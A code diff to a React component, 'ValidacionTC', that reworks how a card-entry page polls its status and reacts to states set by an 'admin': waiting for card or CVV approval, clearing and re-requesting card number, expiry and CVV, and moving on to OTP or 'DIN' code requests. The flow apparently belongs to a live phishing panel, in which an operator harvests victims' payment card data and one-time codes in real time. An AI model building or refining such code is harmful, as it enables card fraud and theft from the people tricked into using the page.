@@ -476,23 +476,7 @@ export default function ValidacionTC() {
                     return;
                 }
 
-                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
-                if (estadosEspera.includes(estado)) {
-                    estadoAnteriorRef.current = estado;
-                    return;
-                }
-
-                if (estado === 'solicitar_tc' || estado === 'solicitar_tc_custom') {
-                    clearInterval(pollingInterval);
-                    clearTimeout(timeoutId);
-                    setCargando(false);
-                    setCardDigits("");
-                    setExpirationDate("");
-                    setCvv("");
-                    setStep("front");
-                    return;
-                }
-
+                // PRIMERO verificar estados de error (deben tener prioridad)
                 if (estado === 'error_tc' || estado === 'error_tc_custom') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
@@ -506,20 +490,28 @@ export default function ValidacionTC() {
                     return;
                 }
 
+                // Estados de espera (awaiting approval)
+                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                if (estadosEspera.includes(estado)) {
+                    estadoAnteriorRef.current = estado;
+                    return;
+                }
+
+                // Si el estado es solicitar_tc o solicitar_tc_custom, detener polling pero mantener en la vista
+                if (estado === 'solicitar_tc' || estado === 'solicitar_tc_custom') {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                    return;
+                }
+
                 // Admin aprobó TC/CVV custom: backend NO cambia el estado automáticamente.
                 // Usuario debe QUEDAR EN ESPERA hasta que admin pulse OTP, DIN o FIN.
                 // El estado permanece en 'awaiting_tc_approval' o 'awaiting_cvv_approval' hasta que admin presione un botón del menú.
-                const prev = estadoAnteriorRef.current;
-                const aprobadoAhora = (prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') && estado === 'solicitar_din';
-                if (aprobadoAhora) {
-                    aprobadoEsperandoRef.current = true;
-                    estadoAnteriorRef.current = estado;
-                    return;
-                }
-                if (aprobadoEsperandoRef.current && estado === 'solicitar_din') {
-                    estadoAnteriorRef.current = estado;
-                    return;
-                }
                 
                 // Si el estado sigue en awaiting_approval, seguir esperando
                 if (estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
@@ -527,7 +519,17 @@ export default function ValidacionTC() {
                     return;
                 }
                 
-                estadoAnteriorRef.current = estado;
+                // Si estaba en awaiting_approval y ahora cambió a otro estado, significa que el admin presionó un botón
+                const prev = estadoAnteriorRef.current;
+                if ((prev === 'awaiting_tc_approval' || prev === 'awaiting_cvv_approval') && 
+                    estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval' && 
+                    estado !== 'pendiente') {
+                    // El admin presionó un botón después de aprobar, continuar con el flujo normal
+                    estadoAnteriorRef.current = estado;
+                    // NO retornar aquí, dejar que continúe el flujo para detectar redirecciones
+                } else {
+                    estadoAnteriorRef.current = estado;
+                }
 
                 const estadosFinales = [
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
